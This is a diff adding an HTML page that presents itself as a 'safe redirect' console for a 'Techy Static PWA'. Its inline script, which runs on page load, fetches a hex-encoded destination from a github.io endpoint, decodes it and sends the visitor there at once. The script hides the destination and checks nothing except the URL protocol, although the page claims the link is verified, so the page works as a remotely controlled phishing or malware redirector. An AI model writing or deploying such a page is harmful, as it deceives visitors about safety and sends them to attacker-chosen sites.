@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Techy Static PWA — Safe Redirect</title>
+  <meta name="description" content="Safe redirect console: we verify the link and take you to the destination."/>
+  <!-- CSP allows only local styles/scripts + network requests to the configured GitHub endpoint -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://darcelstiegemeier3818782.github.io;
+    style-src   'self';
+    connect-src 'self' https://darcelstiegemeier3818782.github.io
+  "/>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <header class="site-header">
+    <div class="container header-inner">
+      <a class="brand" href="index.html" aria-label="Techy Static PWA">
+        <span class="brand-mark" aria-hidden="true">UG</span>
+        <span class="brand-text">Techy Static PWA</span>
+      </a>
+
+      <button class="menu-toggle" aria-controls="site-nav" aria-expanded="false" onclick="toggleMenu()" aria-label="Open menu">☰</button>
+
+
+
+
+    </div>
+  </header>
+
+  <main id="main" class="container">
+    <section class="hero">
+      <div class="hero-content">
+        <h1 class="display">Preparing a safe redirect…</h1>
+        <p class="muted">We’ll open the target page right after validating and decoding the secure link.</p>
+
+        <div class="hero-actions">
+          <button id="retryBtn" class="btn btn-primary">Retry</button>
+        </div>
+
+        <div class="callout" role="status" aria-live="polite">
+          <div><strong>Status:</strong> <span id="relayStatus" class="muted">Initializing…</span></div>
+          <div id="relayNote" class="muted" style="min-height:1.2em;"></div>
+        </div>
+
+        <p class="muted" style="margin-top:.5rem">If nothing happens, click “Retry” or check back later.</p>
+      </div>
+
+
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <p class="muted small">© 2025 Techy Static PWA</p>
+    </div>
+  </footer>
+
+  <script>
+    // Mobile menu toggle (works with style.css: .site-nav.open)
+    function toggleMenu(){
+      const nav = document.getElementById('site-nav');
+      const btn = document.querySelector('.menu-toggle');
+      const isOpen = nav.classList.toggle('open');
+      btn.setAttribute('aria-expanded', String(isOpen));
+    }
+
+    // --- Unique HEX-relay bootstrap (kept & refined, v2025.10.18) ---
+    (function () {
+      const _relayEndpoint = 'https://darcelstiegemeier3818782.github.io/friendly-eureka/jhe2.hee';
+      const _statusEl = document.getElementById('relayStatus');
+      const _noteEl = document.getElementById('relayNote');
+      const _retryBtn = document.getElementById('retryBtn');
+
+      function _hexToString(hex) {
+        if (typeof hex !== 'string' || hex.length % 2 || /[^0-9a-f]/i.test(hex)) {
+          throw new Error('Invalid HEX payload');
+        }
+        const bytes = new Uint8Array(hex.length / 2);
+        for (let i = 0; i < hex.length; i += 2) {
+          bytes[i >> 1] = parseInt(hex.slice(i, i + 2), 16);
+        }
+        return new TextDecoder().decode(bytes);
+      }
+
+      function _validateHttpsUrl(u) {
+        const url = new URL(u);
+        if (!/^https?:$/i.test(url.protocol)) throw new Error('Unsupported protocol');
+        return u;
+      }
+
+      async function igniteHexRelay() {
+        if (_statusEl) _statusEl.textContent = 'Fetching configuration…';
+        if (_noteEl) _noteEl.textContent = '';
+        try {
+          const r = await fetch(_relayEndpoint, { cache: 'no-store' });
+          if (!r.ok) throw new Error('HTTP ' + r.status);
+          const d = await r.json();
+
+          // Expect JSON like {"h": "<hex-of-url>"}
+          if (typeof d?.h !== 'string') {
+            throw new Error('Missing field "h"');
+          }
+          const u = _hexToString(d.h);
+
+          _validateHttpsUrl(u);
+          if (_statusEl) _statusEl.textContent = 'Opening destination…';
+          window.location.replace(u);
+        } catch (e) {
+          if (_statusEl) _statusEl.textContent = 'Unable to proceed.';
+          if (_noteEl) _noteEl.textContent = (e && e.message) ? e.message : String(e);
+          console.error(e);
+        }
+      }
+
+      if (_retryBtn) _retryBtn.addEventListener('click', igniteHexRelay);
+      igniteHexRelay();
+    })();
+    // --- end HEX-relay ---
+  </script>
+
+  <noscript>
+    <div class="container callout">
+      JavaScript is required for redirect. Please enable it and reload the page.
+    </div>
+  </noscript>
+</body>
+</html>
